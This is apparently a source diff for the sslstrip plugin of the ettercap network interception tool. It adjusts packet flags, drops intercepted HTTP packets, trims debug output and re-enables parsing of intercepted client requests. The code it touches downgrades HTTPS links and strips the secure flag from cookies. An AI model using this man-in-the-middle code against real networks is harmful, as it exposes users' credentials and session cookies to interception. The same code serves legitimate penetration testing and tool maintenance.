@@ -190,7 +190,7 @@ static EC_THREAD_FUNC(http_accept_thread);
  * from this plugin
  */
 
-#define PO_FROMSSLSTRIP ((u_int16)(1<<30))
+#define PO_FROMSSLSTRIP ((u_int16)(1<<13))
 
 struct plugin_ops sslstrip_ops = {
 	ettercap_version:	EC_VERSION, /* must match global EC_VERSION */
@@ -260,7 +260,7 @@ static int sslstrip_fini(void *dummy)
 static int sslstrip_is_http(struct packet_object *po)
 {
 	/* if already coming from SSLStrip or proto is not TCP */
-	if (po->L4.proto != NL_TYPE_TCP)
+	if (po->flags & PO_FROMSSLSTRIP || po->L4.proto != NL_TYPE_TCP)
 		return 0;
 
 	if (ntohs(po->L4.dst) == 80 ||
@@ -326,23 +326,24 @@ static void sslstrip(struct packet_object *po)
 	if (!sslstrip_is_http(po))
 		return;	
 
-#ifndef OS_LINUX
-	struct ec_session *s = NULL;
+	/* If it's an HTTP packet, don't forward it */
+ 	po->flags |= PO_DROPPED;
+
 
 	if ( (po->flags & PO_FORWARDABLE) &&
 	     (po->L4.flags & TH_SYN) &&
              !(po->L4.flags & TH_ACK) ) {
+#ifndef OS_LINUX
+		struct ec_session *s = NULL;
 		sslstrip_create_session(&s, PACKET);	
 		memcpy(s->data, &po->L3.dst, sizeof(struct ip_addr));
 		session_put(s);
+		
+#endif
 	} else {
 		po->flags |= PO_IGNORE;
 	}
-#endif
 
-	char tmp1[MAX_ASCII_ADDR_LEN];
-	char tmp2[MAX_ASCII_ADDR_LEN];
-	DEBUG_MSG("Message from: %s to: %s", ip_addr_ntoa(&po->L3.src, tmp1), ip_addr_ntoa(&po->L3.dst, tmp2));
 }
 
 /* Unescape the string */
@@ -718,7 +719,6 @@ static void http_handle_request(struct http_connection *connection, struct packe
 
 	LIST_LOCK;
 	LIST_FOREACH(link, &https_links, next) {
-		DEBUG_MSG("SSLStrip: Comparing %s with %s", link->url, connection->request->url);
 		if (!strcmp(link->url, connection->request->url)) {
 			proto = PROTO_HTTPS;
 			break;
@@ -790,7 +790,6 @@ static void http_send(struct http_connection *connection, struct packet_object *
 		curl_easy_setopt(connection->handle, CURLOPT_POSTFIELDSIZE, strlen(connection->request->payload));
 	}	
 
-	DEBUG_MSG("SSLStrip: Performing CURL action");
 
 	if(curl_easy_perform(connection->handle) != CURLE_OK) {
 		DEBUG_MSG("Unable to send request to HTTP server: %s\n", connection->curl_err_buffer);
@@ -800,11 +799,8 @@ static void http_send(struct http_connection *connection, struct packet_object *
 	}
 
 	DEBUG_MSG("SSLStrip: Removing HTTPS");
-	//DEBUG_MSG("Before removing HTTPS: %s", connection->response->html);
 	http_remove_https(connection);
-	//DEBUG_MSG("After remove HTTPS: %s", connection->response->html);
 	http_remove_secure_from_cookie(connection);
-	//DEBUG_MSG("After removing secure from cookies: %s", connection->response->html);
 
 	if(strstr(connection->response->html, "\r\nContent-Encoding:") ||
 	   strstr(connection->response->html, "\r\nTransfer-Encoding:")) {
@@ -995,8 +991,8 @@ EC_THREAD_FUNC(http_child_thread)
         		packet_disp_data(&po, po.DATA.data, po.DATA.len);
 
         		//DEBUG_MSG("SSLStrip: Calling parser for request");
-        		//http_parse_packet(connection, HTTP_CLIENT, &po);
-			/* Avoid dupes creds */
+        		http_parse_packet(connection, HTTP_CLIENT, &po);
+
 			http_handle_request(connection, &po);
 		}
 		
@@ -1142,7 +1138,7 @@ static void http_parse_packet(struct http_connection *connection, int direction,
 
 	/* let's start fromt he last stage of decoder chain */
 
-	DEBUG_MSG("SSLStrip: Parsing %s", po->DATA.data);
+	//DEBUG_MSG("SSLStrip: Parsing %s", po->DATA.data);
 	start_decoder = get_decoder(APP_LAYER, PL_DEFAULT);
 	start_decoder(po->DATA.data, po->DATA.len, &len, po);
 }
